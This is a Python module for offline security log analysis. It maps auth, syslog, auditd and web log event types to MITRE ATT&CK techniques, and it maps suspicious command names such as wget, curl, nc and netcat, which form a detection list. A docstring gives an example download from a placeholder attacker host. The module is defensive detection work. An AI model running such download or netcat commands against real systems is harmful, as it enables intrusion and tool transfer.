"""
Local MITRE ATT&CK mapping for known event types and suspicious commands.

No external API calls — purely dictionary-based for offline/air-gapped use.
"""

MITRE_MAP: dict[str, tuple[str | None, str | None]] = {
    # ── auth.log ───────────────────────────────────────────────────────────────
    'Failed Login':       ('T1110',     'Brute Force'),
    'Invalid User':       ('T1110.001', 'Password Guessing'),
    'Auth Failure':       ('T1110',     'Brute Force'),
    'Accepted Password':  ('T1078',     'Valid Accounts'),
    'Accepted Publickey': ('T1078',     'Valid Accounts'),
    'Session Opened':     ('T1021.004', 'Remote Services: SSH'),
    'Sudo Command':       ('T1548.003', 'Abuse Elevation Control: Sudo'),
    'Connection Closed':  (None, None),
    'Session Closed':     (None, None),
    'Disconnected':       (None, None),
    # ── syslog ────────────────────────────────────────────────────────────────
    'Service Started':    ('T1543.002', 'Create or Modify System Process: Systemd Service'),
    'Service Stopped':    (None, None),
    'Service Failed':     (None, None),
    'Cron Execution':     ('T1053.003', 'Scheduled Task/Job: Cron'),
    'OOM Kill':           (None, None),
    'USB Connected':      ('T1025',     'Data from Removable Media'),
    # ── auditd ────────────────────────────────────────────────────────────────
    'Process Execution':  (None, None),   # resolved per-command via map_command()
    'Audit Login':        ('T1078',     'Valid Accounts'),
    'Audit Auth Failure': ('T1110',     'Brute Force'),
    'Shell Execution':    ('T1059.004', 'Unix Shell'),
    'File Access':        ('T1003.008', 'OS Credential Dumping: /etc/passwd and /etc/shadow'),
    # ── web access ────────────────────────────────────────────────────────────
    'Web Request':        (None, None),
    'Web Scan':           ('T1595',     'Active Scanning'),
    'Web Attack':         ('T1190',     'Exploit Public-Facing Application'),
    'Admin Access':       ('T1078',     'Valid Accounts'),
    'Web Shell':          ('T1505.003', 'Server Software Component: Web Shell'),
    'Tool Fingerprint':   ('T1595.002', 'Vulnerability Scanning'),
    # ── catch-all ─────────────────────────────────────────────────────────────
    'Other':              (None, None),
}

SUSPICIOUS_COMMANDS: dict[str, tuple[str, str]] = {
    'wget':     ('T1105',     'Ingress Tool Transfer'),
    'curl':     ('T1105',     'Ingress Tool Transfer'),
    'chmod':    ('T1222',     'File and Directory Permissions Modification'),
    'nc':       ('T1059',     'Command and Script Interpreter'),
    'ncat':     ('T1059',     'Command and Script Interpreter'),
    'netcat':   ('T1059',     'Command and Script Interpreter'),
    'python':   ('T1059.006', 'Python'),
    'python3':  ('T1059.006', 'Python'),
    'bash':     ('T1059.004', 'Unix Shell'),
    'sh':       ('T1059.004', 'Unix Shell'),
    'whoami':   ('T1033',     'System Owner/User Discovery'),
    'id':       ('T1033',     'System Owner/User Discovery'),
    'crontab':  ('T1053.003', 'Scheduled Task/Job: Cron'),
    'at':       ('T1053.001', 'Scheduled Task/Job: At'),
    'passwd':   ('T1531',     'Account Access Removal'),
}


def map_event(event_type: str) -> tuple[str | None, str | None]:
    """Return (mitre_id, technique_name) for a known event_type, else (None, None)."""
    return MITRE_MAP.get(event_type, (None, None))


def map_command(command: str) -> tuple[str | None, str | None]:
    """Return (mitre_id, technique_name) for a command string, else (None, None).

    Matches on the base command name, ignoring path prefixes and arguments.
    E.g. '/usr/bin/wget http://evil.com' → ('T1105', 'Ingress Tool Transfer').
    """
    if not command or not command.strip():
        return (None, None)
    base = command.strip().split()[0]
    base = base.split('/')[-1].lower()  # strip path prefix like /usr/bin/
    return SUSPICIOUS_COMMANDS.get(base, (None, None))
